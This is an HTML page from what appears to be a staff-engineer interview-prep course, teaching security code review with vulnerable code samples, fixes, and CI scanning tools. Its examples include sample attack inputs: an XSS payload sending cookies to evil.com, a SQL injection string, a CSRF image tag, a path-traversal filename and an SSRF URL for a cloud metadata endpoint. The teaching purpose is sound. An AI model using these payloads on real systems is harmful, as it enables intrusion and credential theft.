@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 11: Code Review &mdash; Security &amp; Staff Practices - Staff Engineer Prep</title>
+    <link rel="stylesheet" href="../assets/css/style.css">
+    <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+</head>
+<body>
+    <nav class="navbar"><div class="nav-container"><a href="../index.html" class="logo">StaffEngPrep</a><ul class="nav-links"><li><a href="../coding-rounds/index.html">Coding</a></li><li><a href="../system-design/index.html">System Design</a></li><li><a href="../low-level-design/index.html">LLD</a></li><li><a href="../company-specific/index.html">Companies</a></li><li><a href="../behavioral/index.html">Behavioral</a></li><li><a href="../generative-ai/index.html">Gen AI</a></li><li><a href="../metrics-tradeoffs/index.html">Metrics</a></li><li><a href="index.html" style="color: var(--primary-color);">Platform Eng</a></li></ul></div></nav>
+    <div class="layout-with-sidebar">
+        <aside class="sidebar" id="sidebar"><nav class="sidebar-nav">
+            <div class="sidebar-section"><div class="sidebar-section-title">Getting Started</div><a href="index.html" class="sidebar-link">Introduction</a></div>
+            <div class="sidebar-section"><div class="sidebar-section-title">Fundamentals &amp; API Design</div><a href="module-01.html" class="sidebar-link" data-module="1"><span class="sidebar-link-number">1</span>Platform Eng Fundamentals</a><a href="module-02.html" class="sidebar-link" data-module="2"><span class="sidebar-link-number">2</span>API Design &amp; Contracts</a><a href="module-03.html" class="sidebar-link" data-module="3"><span class="sidebar-link-number">3</span>Pagination, Rate Limiting &amp; Gateways</a></div>
+            <div class="sidebar-section"><div class="sidebar-section-title">Connectivity &amp; Reliability</div><a href="module-04.html" class="sidebar-link" data-module="4"><span class="sidebar-link-number">4</span>Webhooks &amp; Event-Driven</a><a href="module-05.html" class="sidebar-link" data-module="5"><span class="sidebar-link-number">5</span>Message Brokers &amp; Pub/Sub</a><a href="module-06.html" class="sidebar-link" data-module="6"><span class="sidebar-link-number">6</span>Resilience Patterns</a></div>
+            <div class="sidebar-section"><div class="sidebar-section-title">Testing &amp; QA</div><a href="module-07.html" class="sidebar-link" data-module="7"><span class="sidebar-link-number">7</span>Testing Strategy &amp; Unit Tests</a><a href="module-08.html" class="sidebar-link" data-module="8"><span class="sidebar-link-number">8</span>Integration &amp; Contract Testing</a><a href="module-09.html" class="sidebar-link" data-module="9"><span class="sidebar-link-number">9</span>E2E &amp; Chaos Testing</a></div>
+            <div class="sidebar-section"><div class="sidebar-section-title">Code Review &amp; Security</div><a href="module-10.html" class="sidebar-link" data-module="10"><span class="sidebar-link-number">10</span>Review: Correctness &amp; Perf</a><a href="module-11.html" class="sidebar-link active" data-module="11"><span class="sidebar-link-number">11</span>Review: Security &amp; Staff Practices</a></div>
+            <div class="sidebar-section"><div class="sidebar-section-title">Observability &amp; Production</div><a href="module-12.html" class="sidebar-link" data-module="12"><span class="sidebar-link-number">12</span>Observability &amp; Prod Readiness</a></div>
+            <div class="sidebar-section"><div class="sidebar-section-title">Scenarios &amp; Mock Interviews</div><a href="module-13.html" class="sidebar-link" data-module="13"><span class="sidebar-link-number">13</span>Scenario Thinking Part 1</a><a href="module-14.html" class="sidebar-link" data-module="14"><span class="sidebar-link-number">14</span>Scenario Thinking Part 2</a><a href="module-15.html" class="sidebar-link" data-module="15"><span class="sidebar-link-number">15</span>Mock Interviews</a></div>
+        </nav></aside>
+        <button class="sidebar-toggle" id="sidebarToggle">&#9776;</button>
+        <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+        <main class="main-content">
+            <h1>Module 11: Code Review &mdash; Security &amp; Staff Practices</h1>
+            <div class="card"><h3>What You'll Learn</h3><ul>
+                <li>OWASP Top 10 vulnerabilities in code reviews with examples</li>
+                <li>Secrets management, dependency scanning, and supply chain security</li>
+                <li>Security "Spot the Bug" exercises</li>
+                <li>Staff-level review: architectural reviews, RFCs, and mentoring</li>
+                <li>Building review culture at scale</li>
+            </ul></div>
+
+            <h2>OWASP Top 10 in Code Reviews</h2>
+
+            <div class="collapsible">
+                <div class="collapsible-header"><span>Q: How do you spot SQL injection, XSS, and CSRF in code reviews?</span></div>
+                <div class="collapsible-content">
+                    <p><strong>SQL Injection:</strong></p>
+                    <pre><code class="language-python"># VULNERABLE
+query = f"SELECT * FROM users WHERE email = '{email}'"
+# Input: ' OR '1'='1' -- reveals all users
+
+# SAFE: parameterized query
+query = "SELECT * FROM users WHERE email = $1"
+result = db.execute(query, [email])</code></pre>
+
+                    <p><strong>XSS (Cross-Site Scripting):</strong></p>
+                    <pre><code class="language-javascript">// VULNERABLE: inserting user input as HTML
+element.innerHTML = `Welcome, ${userName}`;
+// Input: &lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;
+
+// SAFE: use textContent or framework escaping
+element.textContent = `Welcome, ${userName}`;
+// In React: {userName} is auto-escaped</code></pre>
+
+                    <p><strong>CSRF (Cross-Site Request Forgery):</strong></p>
+                    <pre><code class="language-python"># VULNERABLE: state-changing GET without CSRF token
+@app.get("/transfer")  # GET should be idempotent!
+def transfer(to: str, amount: float):
+    # Attacker can embed: &lt;img src="https://bank.com/transfer?to=attacker&amp;amount=1000"&gt;
+    execute_transfer(current_user, to, amount)
+
+# SAFE: POST with CSRF token
+@app.post("/transfer")
+def transfer(request: Request, to: str, amount: float):
+    verify_csrf_token(request)
+    execute_transfer(current_user, to, amount)</code></pre>
+                    <p><strong>Red flags in review:</strong> String concatenation in SQL/HTML, <code>innerHTML</code>, missing CSRF tokens on state-changing endpoints, GET requests that modify data.</p>
+                </div>
+            </div>
+
+            <div class="collapsible">
+                <div class="collapsible-header"><span>Q: How do you review code for proper secrets management?</span></div>
+                <div class="collapsible-content">
+                    <p><strong>A:</strong> Look for hardcoded secrets, insecure storage, and improper handling:</p>
+                    <pre><code class="language-python"># RED FLAGS in code review:
+API_KEY = "sk_live_XXXXXXXXXXXXXXXXXXXX"  # Hardcoded secret!
+password = "admin123"  # Default credential!
+conn_string = "postgresql://admin:password@prod-db:5432/mydb"  # Credentials in code!
+
+# CORRECT: Use environment variables or secret manager
+API_KEY = os.environ["STRIPE_API_KEY"]
+# Or better: use a secrets manager
+from azure.keyvault.secrets import SecretClient
+secret = client.get_secret("stripe-api-key").value</code></pre>
+
+                    <p><strong>Review checklist for secrets:</strong></p>
+                    <ul>
+                        <li>No secrets in code, config files, or environment variable defaults</li>
+                        <li>No secrets in git history (check if secrets were committed then "removed")</li>
+                        <li><code>.gitignore</code> includes <code>.env</code>, <code>*.key</code>, <code>*.pem</code></li>
+                        <li>Secrets loaded from environment variables or a secret manager</li>
+                        <li>Different secrets per environment (dev/staging/prod)</li>
+                        <li>Secrets not logged (check log statements for request bodies containing tokens)</li>
+                    </ul>
+                    <p><strong>Tools:</strong> git-secrets, trufflehog, detect-secrets (pre-commit hooks that scan for secrets)</p>
+                </div>
+            </div>
+
+            <h2>Security Spot the Bug</h2>
+
+            <div class="collapsible">
+                <div class="collapsible-header"><span>Security Bug #1: File upload endpoint</span></div>
+                <div class="collapsible-content">
+                    <pre><code class="language-python">@app.post("/upload")
+async def upload_file(file: UploadFile):
+    file_path = f"/uploads/{file.filename}"
+    with open(file_path, "wb") as f:
+        content = await file.read()
+        f.write(content)
+    return {"path": file_path}</code></pre>
+                    <p><strong>Vulnerabilities:</strong></p>
+                    <ol>
+                        <li><strong>Path traversal</strong> &mdash; filename could be <code>../../etc/passwd</code>. Sanitize filename or use a generated UUID.</li>
+                        <li><strong>No file type validation</strong> &mdash; User could upload executable files (.php, .sh).</li>
+                        <li><strong>No file size limit</strong> &mdash; User could upload a 10GB file and fill the disk.</li>
+                        <li><strong>Serving uploads from app domain</strong> &mdash; Uploaded HTML/JS could execute in the app's origin (stored XSS). Serve from a separate domain.</li>
+                    </ol>
+                </div>
+            </div>
+
+            <div class="collapsible">
+                <div class="collapsible-header"><span>Security Bug #2: Password reset</span></div>
+                <div class="collapsible-content">
+                    <pre><code class="language-python">@app.post("/reset-password")
+async def reset_password(email: str):
+    user = await db.fetch_one("SELECT * FROM users WHERE email = $1", email)
+    if not user:
+        raise HTTPException(404, "User not found")
+
+    token = str(random.randint(100000, 999999))  # 6-digit code
+    await redis.set(f"reset:{token}", user.id, ex=3600)
+    await send_email(email, f"Your reset code: {token}")
+    return {"message": "Reset email sent"}</code></pre>
+                    <p><strong>Vulnerabilities:</strong></p>
+                    <ol>
+                        <li><strong>User enumeration</strong> &mdash; 404 for non-existent emails reveals which emails are registered. Always return the same message.</li>
+                        <li><strong>Weak token</strong> &mdash; 6-digit numeric code has only 900,000 possibilities. Brute-forceable. Use cryptographically secure random tokens (32+ bytes).</li>
+                        <li><strong>No rate limiting</strong> &mdash; Attacker can brute-force the token by trying all 900K combinations.</li>
+                        <li><strong>Token stored without hashing</strong> &mdash; If Redis is compromised, all reset tokens are exposed. Hash the token in storage.</li>
+                        <li><strong>python random module</strong> &mdash; Not cryptographically secure. Use <code>secrets.token_urlsafe()</code>.</li>
+                    </ol>
+                </div>
+            </div>
+
+            <div class="collapsible">
+                <div class="collapsible-header"><span>Security Bug #3: API authorization</span></div>
+                <div class="collapsible-content">
+                    <pre><code class="language-python">@app.get("/users/{user_id}/orders")
+async def get_user_orders(user_id: str, current_user: User = Depends(get_current_user)):
+    orders = await db.fetch_all(
+        "SELECT * FROM orders WHERE user_id = $1", user_id
+    )
+    return orders</code></pre>
+                    <p><strong>Vulnerability: IDOR (Insecure Direct Object Reference)</strong></p>
+                    <p>The endpoint authenticates the user but doesn't check if <code>current_user</code> is authorized to view <code>user_id</code>'s orders. Any authenticated user can view any other user's orders by changing the URL.</p>
+                    <pre><code class="language-python"># FIXED: verify authorization
+@app.get("/users/{user_id}/orders")
+async def get_user_orders(user_id: str, current_user: User = Depends(get_current_user)):
+    if current_user.id != user_id and not current_user.is_admin:
+        raise HTTPException(403, "Not authorized")
+    orders = await db.fetch_all(
+        "SELECT * FROM orders WHERE user_id = $1", user_id
+    )
+    return orders</code></pre>
+                </div>
+            </div>
+
+            <div class="collapsible">
+                <div class="collapsible-header"><span>Security Bug #4: SSRF in webhook registration</span></div>
+                <div class="collapsible-content">
+                    <pre><code class="language-python">@app.post("/webhooks")
+async def register_webhook(url: str):
+    # Verify the URL is reachable
+    response = requests.get(url, timeout=5)
+    if response.status_code == 200:
+        await db.execute("INSERT INTO webhooks (url) VALUES ($1)", url)
+        return {"status": "registered"}
+    return {"error": "URL not reachable"}</code></pre>
+                    <p><strong>Vulnerability: SSRF (Server-Side Request Forgery)</strong></p>
+                    <p>The server makes a request to a user-provided URL. Attacker can provide <code>http://169.254.169.254/latest/meta-data/</code> (AWS metadata endpoint) or <code>http://internal-service:8080/admin</code> to access internal resources.</p>
+                    <p><strong>Fix:</strong> Validate URL against allowlist, block private IP ranges, resolve DNS and check the IP, don't follow redirects to internal addresses.</p>
+                </div>
+            </div>
+
+            <div class="collapsible">
+                <div class="collapsible-header"><span>Security Bug #5: JWT handling</span></div>
+                <div class="collapsible-content">
+                    <pre><code class="language-python">import jwt
+
+@app.middleware("http")
+async def auth_middleware(request, call_next):
+    token = request.headers.get("Authorization", "").replace("Bearer ", "")
+    try:
+        payload = jwt.decode(token, options={"verify_signature": False})
+        request.state.user = payload
+    except jwt.DecodeError:
+        return JSONResponse(status_code=401, content={"error": "Invalid token"})
+    return await call_next(request)</code></pre>
+                    <p><strong>Vulnerability:</strong></p>
+                    <ol>
+                        <li><strong>Signature verification disabled!</strong> &mdash; <code>verify_signature: False</code> means anyone can forge a JWT. This is the most critical vulnerability.</li>
+                        <li><strong>No algorithm restriction</strong> &mdash; Vulnerable to algorithm confusion attack (attacker uses "none" algorithm).</li>
+                        <li><strong>No expiration check</strong> &mdash; Expired tokens are accepted.</li>
+                        <li><strong>No issuer/audience validation</strong> &mdash; Tokens from other services are accepted.</li>
+                    </ol>
+                    <pre><code class="language-python"># FIXED
+payload = jwt.decode(
+    token,
+    SECRET_KEY,
+    algorithms=["RS256"],  # Restrict to expected algorithm
+    options={"require": ["exp", "iss", "aud"]},
+    issuer="https://auth.example.com",
+    audience="api.example.com",
+)</code></pre>
+                </div>
+            </div>
+
+            <h2>Staff-Level Practices</h2>
+
+            <div class="collapsible">
+                <div class="collapsible-header"><span>Q: What does staff-level code review look like beyond individual PRs?</span></div>
+                <div class="collapsible-content">
+                    <p><strong>A:</strong> Staff engineers review at multiple levels:</p>
+                    <ul>
+                        <li><strong>PR reviews</strong> &mdash; Focus on architecture, failure modes, security (not style)</li>
+                        <li><strong>Design document / RFC reviews</strong> &mdash; Review before code is written. Catch design issues early when they're cheap to fix.</li>
+                        <li><strong>Architecture reviews</strong> &mdash; Periodic review of system-level patterns, dependency graphs, service boundaries</li>
+                        <li><strong>Review the reviews</strong> &mdash; Check that team members are giving quality feedback, not just rubber-stamping</li>
+                    </ul>
+                    <p><strong>RFC review checklist:</strong></p>
+                    <ul>
+                        <li>Are alternatives considered with tradeoffs?</li>
+                        <li>What are the failure modes?</li>
+                        <li>How will this be tested?</li>
+                        <li>What's the rollback plan?</li>
+                        <li>What's the migration strategy for existing data/clients?</li>
+                        <li>What metrics will prove this was successful?</li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="collapsible">
+                <div class="collapsible-header"><span>Q: How do you automate security reviews in the CI pipeline?</span></div>
+                <div class="collapsible-content">
+                    <table>
+                        <thead><tr><th>Tool Type</th><th>What It Checks</th><th>Examples</th></tr></thead>
+                        <tbody>
+                            <tr><td><strong>SAST</strong></td><td>Source code for vulnerabilities</td><td>Semgrep, CodeQL, SonarQube</td></tr>
+                            <tr><td><strong>DAST</strong></td><td>Running application for vulnerabilities</td><td>OWASP ZAP, Burp Suite</td></tr>
+                            <tr><td><strong>SCA</strong></td><td>Dependencies for known CVEs</td><td>Dependabot, Snyk, Trivy</td></tr>
+                            <tr><td><strong>Secret scanning</strong></td><td>Committed secrets</td><td>git-secrets, trufflehog, GitHub secret scanning</td></tr>
+                            <tr><td><strong>Container scanning</strong></td><td>Docker images for CVEs</td><td>Trivy, Anchore, Snyk Container</td></tr>
+                            <tr><td><strong>IaC scanning</strong></td><td>Terraform/K8s misconfigurations</td><td>Checkov, tfsec, kube-bench</td></tr>
+                        </tbody>
+                    </table>
+                    <pre><code class="language-yaml"># GitHub Actions security pipeline
+jobs:
+  security:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: SAST with Semgrep
+        run: semgrep --config=auto --error .
+      - name: Dependency scan
+        run: trivy fs --severity HIGH,CRITICAL .
+      - name: Secret scan
+        run: trufflehog filesystem . --only-verified</code></pre>
+                </div>
+            </div>
+
+            <div class="collapsible">
+                <div class="collapsible-header"><span>Q: How do you build a healthy code review culture at scale?</span></div>
+                <div class="collapsible-content">
+                    <p><strong>A:</strong></p>
+                    <ul>
+                        <li><strong>Set SLAs:</strong> Reviews should happen within 4 working hours. Track and report review turnaround time.</li>
+                        <li><strong>Small PRs:</strong> Encourage PRs under 400 lines. Large PRs get rubber-stamped, not reviewed.</li>
+                        <li><strong>Clear expectations:</strong> Define what "approval" means (no blocking bugs found, not "I agree with every line").</li>
+                        <li><strong>Automate the boring stuff:</strong> Linting, formatting, type checking in CI. Humans review logic and design.</li>
+                        <li><strong>Rotate reviewers:</strong> Don't always assign to the same person. Spread knowledge and prevent bottlenecks.</li>
+                        <li><strong>Celebrate good reviews:</strong> Recognize engineers who give thorough, educational reviews.</li>
+                        <li><strong>Blameless retrospectives:</strong> When bugs escape review, discuss the process failure, not the people.</li>
+                    </ul>
+                    <p><strong>Staff engineer's role:</strong> Model the behavior you want. Give thorough reviews on important PRs. Praise good code and good reviews publicly. Set the standard through action, not policy documents.</p>
+                </div>
+            </div>
+
+            <div class="flex flex-between mt-4">
+                <a href="module-10.html" class="btn btn-secondary">&larr; Correctness Review</a>
+                <a href="module-12.html" class="btn btn-primary">Next: Observability &rarr;</a>
+            </div>
+        </main>
+    </div>
+    <script src="../assets/js/app.js"></script>
+</body>
+</html>
